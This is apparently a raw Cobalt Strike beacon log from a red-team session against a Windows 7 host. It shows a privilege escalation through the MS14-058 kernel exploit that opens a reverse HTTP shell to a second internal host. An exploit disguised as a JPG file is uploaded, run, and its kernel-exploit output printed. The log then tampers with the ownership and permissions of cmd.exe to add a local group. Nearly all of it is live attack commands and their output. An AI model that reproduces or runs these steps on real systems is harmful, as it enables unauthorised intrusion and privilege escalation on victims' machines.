02/03 10:32:43 [metadata] 172.17.2.54 <- 172.17.2.54; computer: A-PC; user: a *; pid: 3792; os: Windows; version: 6.1; beacon arch: x86 (x64)
02/03 10:32:52 [input] <neo> elevate ms14-058 test
02/03 10:32:53 [task] Tasked beacon to run windows/beacon_http/reverse_http (172.17.2.56:80) via ms14-058
02/03 10:33:14 [task] Tasked beacon to make directory c:\RedTeam\
02/03 10:33:14 [task] cd c:\RedTeam\
02/03 10:33:14 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\win32UIDEMO.JPG as win32UIDEMO.JPG
02/03 10:33:14 [indicator] file: 071e62bfe2e1a86254eb5d5ba24f5495 31744 bytes win32UIDEMO.JPG
02/03 10:33:14 [task] Tasked beacon to run: C:\RedTeam\win32UIDEMO.JPG
02/03 10:33:40 [checkin] host called home, sent: 136369 bytes
02/03 10:33:42 [output]
received output:
[*] Getting Windows version...
[*] Solving symbols...
[*] Requesting Kernel loaded modules...
[*] pZwQuerySystemInformation required length 43224
[*] Parsing SYSTEM_INFO...
[*] 146 Kernel modules found
[*] Checking module \SystemRoot\system32\ntoskrnl.exe
[*] Good! nt found as ntoskrnl.exe at 0x03c16000
[*] ntoskrnl.exe loaded in userspace at: 40000000
[*] pPsLookupProcessByProcessId in kernel: 0xFFFFF80003F691FC
[*] pPsReferencePrimaryToken in kernel: 0xFFFFF80003F6C9D0
[*] Registering class...
[*] Creating window...
[*] Allocating null page...
[*] Getting PtiCurrent...
[*] Good! dwThreadInfoPtr 0xFFFFF900C35FE500
[*] Creating a fake structure at NULL...
[*] Triggering vulnerability...
[!] Executing payload...


02/03 11:26:21 [task] Tasked beacon to run: takeown /F "C:\Windows\System32\cmd.exe" /A
02/03 11:26:21 [task] Tasked beacon to run: icacls "C:\Windows\System32\cmd.exe" /grant Administrators:F
02/03 11:26:21 [task] Tasked beacon to run: rename cmd.exe cmd_back.exe
02/03 11:26:21 [task] Tasked beacon to run: C:\Windows\System32\cmd_back.exe Net Localgroup Tests /add
02/03 11:26:21 [task] Tasked beacon to run: rename cmd_back.exe cmd.exe
02/03 11:26:42 [checkin] host called home, sent: 370 bytes
02/03 11:26:42 [output]
received output:

成功: 此文件(或文件夹): "C:\Windows\System32\cmd.exe" 现在由管理员组所有。


02/03 11:26:42 [output]
received output:
已处理的文件: C:\Windows\System32\cmd.exe
已成功处理 1 个文件; 处理 0 个文件时失败


02/03 11:26:42 [output]
received output:
系统找不到指定的文件。


02/03 11:26:42 [output]
received output:
系统无法在消息文件中为 Application 找到消息号为 0x2350 的消息文本。

版权所有 (c) 2009 Microsoft Corporation。保留所有权利。
系统无法在消息文件中为 System 找到消息号为 0x8 的消息文本。

c:\RedTeam>

